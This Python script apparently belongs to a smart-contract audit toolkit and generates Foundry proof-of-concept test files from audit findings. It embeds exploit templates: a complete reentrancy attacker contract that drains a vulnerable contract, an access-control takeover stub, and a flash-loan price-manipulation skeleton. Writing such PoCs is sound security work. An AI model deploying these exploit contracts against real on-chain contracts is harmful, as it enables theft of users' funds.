#!/usr/bin/env python3
"""
PoC Generator — Generate Foundry exploit templates from audit findings.
========================================================================
Takes audit findings and generates skeleton Foundry test files for
creating proof-of-concept exploits.

Usage:
    python poc_generator.py reports/audit.json
    python poc_generator.py reports/audit.json --output foundry-workspace/test/
"""
import json
import sys
import argparse
from pathlib import Path
from datetime import datetime


POC_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/*
 * PoC Exploit: {title}
 * Severity: {severity}
 * Agent: {agent}
 * Location: {location}
 *
 * Description:
 * {description}
 *
 * Recommendation:
 * {recommendation}
 *
 * Generated: {date}
 */

interface ITarget {{
    // TODO: Add target contract interface functions
    // Example:
    // function deposit() external payable;
    // function withdraw(uint256 amount) external;
    // function balanceOf(address) external view returns (uint256);
}}

contract {test_name} is Test {{
    ITarget target;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {{
        // Option 1: Fork mainnet
        // vm.createSelectFork("mainnet", BLOCK_NUMBER);
        // target = ITarget(TARGET_ADDRESS);

        // Option 2: Deploy locally
        // target = ITarget(address(new TargetContract()));

        // Fund accounts
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
    }}

    function test_{exploit_name}() public {{
        // === SETUP ===
        // Victim deposits (normal behavior)
        vm.startPrank(victim);
        // target.deposit{{value: 10 ether}}();
        vm.stopPrank();

        // === EXPLOIT ===
        vm.startPrank(attacker);

        // TODO: Implement exploit based on finding:
        // {description_short}
        //
        // Steps:
        // 1.
        // 2.
        // 3.

        vm.stopPrank();

        // === VERIFY ===
        // Verify the exploit succeeded
        // assertGt(attacker.balance, 100 ether, "Attacker should have profited");
        // assertLt(address(target).balance, 10 ether, "Target should have lost funds");
    }}
}}

/*
 * If the exploit requires a malicious contract (e.g., reentrancy):
 *
 * contract AttackContract {{
 *     ITarget target;
 *     constructor(address _target) {{
 *         target = ITarget(_target);
 *     }}
 *
 *     function attack() external payable {{
 *         target.deposit{{value: msg.value}}();
 *         target.withdraw(msg.value);
 *     }}
 *
 *     receive() external payable {{
 *         if (address(target).balance >= 1 ether) {{
 *             target.withdraw(1 ether);
 *         }}
 *     }}
 * }}
 */
'''

REENTRANCY_POC = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/*
 * PoC: Reentrancy Exploit — {title}
 * Location: {location}
 * Generated: {date}
 */

interface IVulnerable {{
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}}

contract ReentrancyAttacker {{
    IVulnerable public target;
    uint256 public attackAmount;

    constructor(address _target) {{
        target = IVulnerable(_target);
    }}

    function attack() external payable {{
        attackAmount = msg.value;
        target.deposit{{value: msg.value}}();
        target.withdraw(msg.value);
    }}

    receive() external payable {{
        if (address(target).balance >= attackAmount) {{
            target.withdraw(attackAmount);
        }}
    }}

    function getBalance() external view returns (uint256) {{
        return address(this).balance;
    }}
}}

contract {test_name} is Test {{
    IVulnerable target;
    ReentrancyAttacker attacker;

    function setUp() public {{
        // TODO: Deploy or fork the vulnerable contract
        // target = IVulnerable(address(new VulnerableContract()));
        // attacker = new ReentrancyAttacker(address(target));

        // Seed the target with victim funds
        // vm.deal(address(this), 10 ether);
        // target.deposit{{value: 10 ether}}();
    }}

    function test_reentrancy_exploit() public {{
        uint256 targetBalanceBefore = address(target).balance;

        // Attack with 1 ETH, drain all
        vm.deal(address(attacker), 1 ether);
        attacker.attack{{value: 1 ether}}();

        // Verify drain
        assertEq(address(target).balance, 0, "Target should be drained");
        assertGt(attacker.getBalance(), 1 ether, "Attacker should profit");

        emit log_named_uint("Stolen", attacker.getBalance() - 1 ether);
    }}
}}
'''

ACCESS_CONTROL_POC = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/*
 * PoC: Access Control Exploit — {title}
 * Location: {location}
 * Generated: {date}
 */

interface IVulnerable {{
    // TODO: Add the unprotected function signatures
    function initialize(address) external;
    function setOwner(address) external;
    function mint(address, uint256) external;
    function withdraw() external;
}}

contract {test_name} is Test {{
    IVulnerable target;
    address attacker = makeAddr("attacker");

    function setUp() public {{
        // TODO: Deploy or fork
    }}

    function test_access_control_exploit() public {{
        vm.startPrank(attacker);

        // Re-initialize and take ownership
        // target.initialize(attacker);

        // Or directly call unprotected admin function
        // target.mint(attacker, 1_000_000e18);

        // Or steal funds
        // target.withdraw();

        vm.stopPrank();

        // Verify
        // assertEq(target.owner(), attacker);
    }}
}}
'''

FLASH_LOAN_POC = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/*
 * PoC: Flash Loan / Oracle Manipulation — {title}
 * Location: {location}
 * Generated: {date}
 */

interface IERC20 {{
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}}

interface IFlashLoanProvider {{
    // Aave V3
    function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params, uint16 referral) external;
}}

interface ITarget {{
    // TODO: Add target interface
}}

contract FlashLoanAttacker {{
    IFlashLoanProvider public lender;
    ITarget public target;

    constructor(address _lender, address _target) {{
        lender = IFlashLoanProvider(_lender);
        target = ITarget(_target);
    }}

    function attack(address asset, uint256 amount) external {{
        // 1. Borrow via flash loan
        lender.flashLoanSimple(address(this), asset, amount, "", 0);
    }}

    // Aave V3 callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {{
        // 2. Manipulate price (e.g., swap large amount on DEX)
        // TODO: Add manipulation logic

        // 3. Exploit target at manipulated price
        // TODO: Add exploit logic

        // 4. Reverse manipulation
        // TODO: Undo the price manipulation

        // 5. Repay flash loan + premium
        uint256 repayAmount = amount + premium;
        IERC20(asset).approve(address(lender), repayAmount);

        return true;
    }}
}}

contract {test_name} is Test {{
    function setUp() public {{
        // Fork mainnet
        // vm.createSelectFork("mainnet");
    }}

    function test_flash_loan_exploit() public {{
        // TODO: Deploy attacker, execute attack, verify profit
    }}
}}
'''


def sanitize_name(s: str) -> str:
    """Convert a finding title to a valid Solidity identifier."""
    cleaned = "".join(c if c.isalnum() or c == '_' else '_' for c in s)
    cleaned = cleaned.strip('_')
    # Remove consecutive underscores
    while '__' in cleaned:
        cleaned = cleaned.replace('__', '_')
    return cleaned[:50]


def generate_poc(finding: dict, output_dir: str) -> str | None:
    """Generate a PoC template for a finding."""
    severity = finding.get("severity", "INFO")
    if severity in ("INFO", "LOW"):
        return None

    title = finding.get("title", "Unknown")
    agent = finding.get("agent", "")
    exploit_name = sanitize_name(title)
    test_name = f"Test_{exploit_name}"

    # Select template based on vulnerability type
    title_lower = title.lower()
    if "reentrancy" in title_lower:
        template = REENTRANCY_POC
    elif "access control" in title_lower or "unprotected" in title_lower or "initialize" in title_lower:
        template = ACCESS_CONTROL_POC
    elif "oracle" in title_lower or "flash" in title_lower or "price" in title_lower or "reserve" in title_lower:
        template = FLASH_LOAN_POC
    else:
        template = POC_TEMPLATE

    description = finding.get("description", "")
    content = template.format(
        title=title,
        severity=severity,
        agent=agent,
        location=finding.get("location", ""),
        description=description,
        description_short=description[:100],
        recommendation=finding.get("recommendation", ""),
        date=datetime.now().strftime("%Y-%m-%d"),
        test_name=test_name,
        exploit_name=exploit_name,
    )

    out_path = Path(output_dir)
    out_path.mkdir(parents=True, exist_ok=True)
    file_path = out_path / f"{test_name}.t.sol"
    file_path.write_text(content, encoding="utf-8")
    return str(file_path)


def main():
    parser = argparse.ArgumentParser(description="Generate Foundry PoC templates from audit findings")
    parser.add_argument("report", help="JSON audit report file")
    parser.add_argument("--output", "-o", default="foundry-workspace/test/poc",
                        help="Output directory for PoC files")
    parser.add_argument("--min-severity", "-s", default="MEDIUM",
                        choices=["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"],
                        help="Minimum severity to generate PoC for")

    args = parser.parse_args()
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    min_sev = severity_order.get(args.min_severity, 2)

    report_path = Path(args.report)
    if not report_path.exists():
        print(f"[ERROR] Report not found: {args.report}")
        sys.exit(1)

    report = json.loads(report_path.read_text(encoding="utf-8"))
    findings = report.get("findings", [])

    print(f"[*] Loaded {len(findings)} findings from {args.report}")
    generated = 0

    for finding in findings:
        sev = finding.get("severity", "INFO")
        if severity_order.get(sev, 4) <= min_sev:
            result = generate_poc(finding, args.output)
            if result:
                print(f"  [+] Generated: {result}")
                generated += 1

    print(f"\n[*] Generated {generated} PoC templates in {args.output}/")
    print(f"[*] Next: Edit the templates, add contract addresses, and run:")
    print(f"    cd foundry-workspace && forge test --match-path test/poc/ -vvvv")


if __name__ == "__main__":
    main()
